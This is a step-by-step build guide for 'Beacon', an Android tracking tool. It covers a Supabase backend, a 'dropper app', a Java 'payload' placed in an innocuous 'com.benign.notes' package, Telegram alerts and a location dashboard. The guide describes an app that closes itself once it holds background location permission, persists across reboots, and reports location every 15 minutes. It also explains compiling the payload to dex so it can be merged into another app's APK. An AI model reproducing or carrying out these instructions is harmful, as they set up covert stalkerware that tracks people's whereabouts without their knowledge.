Beacon Setup Guide — Offline

This guide walks the full build end-to-end: Supabase project → dropper app → payload → dashboard. Every step links to the file it uses. Save this file, open it in any browser — it works with no internet.

0. What you need

  • Android Studio (includes SDK 34 and platform-tools)
  • A Supabase account — supabase.com — free tier is enough
  • A test device (real hardware — getLastKnownLocation is unreliable in emulators)
  • Supabase project ref + anon key (you create these in step 1)
Before you start: the payload Beacon.java has two placeholders you must fill before compiling: SB_URL and SB_KEY. You get both in step 1.

1. Supabase project

Step 1.1 — create the project
  1. Sign in at supabase.com → New Project
  2. Name it anything, choose a region close to you, set a DB password
  3. Wait for provisioning (~2 min)
  4. Once inside, go to Project Settings → API
  5. Note down:
    • Project URL — e.g. https://abcdefgh.supabase.co — this is your SB_URL
    • anon public key — the long eyJ… string — this is your SB_KEY
Step 1.2 — create the table
  1. Supabase dashboard → SQL Editor → New Query
  2. Paste the contents of schema.sql (File 7 above)
  3. Run — you should see beacons appear under Table Editor
Check: Table Editor → beacons → columns id, ts, lat, lon, sdk, batt, model. If any column is missing, re-run the SQL.

2. Telegram push (optional)

Skippable. If you skip, use the dashboard to see results instead.

Step 2.1 — create a bot
  1. In Telegram, message @BotFather → /newbot → follow prompts
  2. BotFather gives a bot token — e.g. 123456:AA…
  3. Message your new bot once (any text) so it can message you back
  4. Open https://api.telegram.org/bot<TOKEN>/getUpdates in a browser → find chat.id in the JSON — this is your TG_CHAT
Step 2.2 — create the Edge Function
  1. Supabase dashboard → Edge Functions → Create Function → name it push
  2. Paste the contents of supabase/functions/push/index.ts (File 8 above)
  3. Deploy
  4. Supabase dashboard → Edge Functions → push → Settings → Secrets → add:
    • TG_TOKEN — the bot token from BotFather
    • TG_CHAT — the chat.id from getUpdates
  5. Edge Functions → push → Webhooks → connect it to Insert on table beacons
Check: Table Editor → insert any row manually into beacons → your bot should message you within a second.

3. Dropper app

Step 3.1 — create the project
  1. Android Studio → New Project → Empty Views Activity → language Kotlin, min SDK 26
  2. Application name anything, package name anything — the manifest and build.gradle must agree with what you choose
Step 3.2 — add the files
  1. Replace AndroidManifest.xml (File 1)
  2. Replace app/build.gradle (File 2)
  3. Add MainActivity.kt (File 4) — replace the generated one
  4. Add BeaconWorker.kt (File 5)
  5. Add BeaconService.kt (File 6a)
  6. Add BootReceiver.kt (File 6b)
Step 3.3 — compile
  1. Build → Make Project
  2. Fix any Kotlin/manifest compile errors (usually a missing import)
  3. The APK appears under app/build/outputs/apk/debug/

4. Payload

Step 4.1 — fill the placeholders
  1. Open Beacon.java (File 3)
  2. Set SB_URL to your Supabase Project URL from step 1.1
  3. Set SB_KEY to your anon public key from step 1.1
Step 4.2 — two ways to build
Option A — drop it into the dropper project
  1. Copy Beacon.java into app/src/main/java/com/benign/notes/
  2. Rebuild — done. Simplest path.
Option B — compile standalone via javac against android.jar 
javac -cp $ANDROID_HOME/platforms/android-34/android.jar \
      -d out Beacon.java

d8 --output payload-dex out/com/benign/notes/Beacon.class

Use Option B if you're repackaging into an existing app. The payload-dex can be merged into another APK's dex.

5. Test on device

Step 5.1 — install and grant
  1. Enable Developer Options + USB debugging on the test device
  2. Install via adb install app-debug.apk, or copy to device and sideload
  3. Open the app → the interactive permission dialog appears → Allow location
  4. Android 10+ → the background-location settings deep-link opens → Allow all the time
  5. The app closes itself — that's expected. The beacon already fired once.
Check: Supabase → Table Editor → beacons → a new row with your device's model, ts = now, and lat/lon filled (if the device has a location cache). If lat/lon are null, the cache was empty — the worker will get a fresh fix on the next 15-min cycle.
Step 5.2 — verify persistence
  1. Reboot the device
  2. Wait ≥ 15 min
  3. Refresh Table Editor → another row should appear (from BootReceiver → WorkManager)

6. Dashboard

Step 6.1 — set it up
  1. Open dashboard.html (File 9)
  2. Replace SUPABASE_URL and SUPABASE_KEY with your values from step 1.1
  3. Replace DEVICE_ID with your device's ANDROID_ID to filter — or leave null to show all devices
  4. Open the file in any browser (double-click works — it's static)
Check: the map centers on your device's last fix, a red marker marks the newest row, and the info panel updates every 30 s.

7. Troubleshooting

  • Check Edge Functions → push → Logs for errors.
  • Verify TG_TOKEN and TG_CHAT secrets are set exactly (no quotes around values).
  • Verify the webhook is bound to Insert on beacons, not Update.
    • SymptomMost likely causeFix
    Table has no rows after install Location permission not granted Settings → Apps → your app → Permissions → Location → Allow all the time. Then open the app again to re-fire.
    Row appears but lat/lon are null Empty location cache + no fresh fix yet Open Google Maps on the device once (warms the cache), or wait for the next 15-min WorkManager cycle.
    Nothing after reboot BootReceiver didn't fire Check the manifest has RECEIVE_BOOT_COMPLETED and the receiver is declared. Some OEMs (Xiaomi, Oppo) require Auto-start enabled in Settings → battery / app info.
    Rows stopped after some time WorkManager pruned by the OEM Same fix — Auto-start / battery-optimization whitelist. Test on a stock Android device (Pixel) first to confirm the code works, then debug the OEM.
    Telegram bot silent Edge function or secrets misconfigured
    Telegram sends a 401 Bot token wrong or bot never messaged Re-check the token from BotFather. Also message the bot once from your account — Telegram blocks bots from starting the conversation.
    Dashboard shows "no beacons yet" Wrong DEVICE_ID filter Set DEVICE_ID = null to show every device, confirm rows appear, then re-add the filter with the correct ANDROID_ID.
    Dashboard map is empty even with rows lat/lon null in all rows Same fix as above — warm the device's location cache.
    Compile error in Beacon.java Missing import or wrong package The file is self-contained — check the package com.benign.notes; line matches your project's package path.
    WorkManager cycles never run Battery optimization killing the app Settings → Apps → your app → Battery → Unrestricted.
    Supabase insert returns 403 RLS policy missing Re-run schema.sql — the anon insert policy must exist. Check under Authentication → Policies → beacons.

    Device-dependent gotchas

    • Android 9 and below — background location is implied by foreground; no deep-link. Everything else works.
    • Android 10–11 — background location must be granted via the settings deep-link, the runtime dialog is not enough.
    • Android 12+ — precise location can be denied while coarse is granted. Check both. WorkManager can also be pruned more aggressively; test with the app in the foreground once.
    • OEM battery managers (Xiaomi MIUI, Samsung, Oppo/Realme) — the biggest source of "it worked yesterday" issues. Whitelist the app in Auto-start and battery settings, or confirm on a Pixel first.
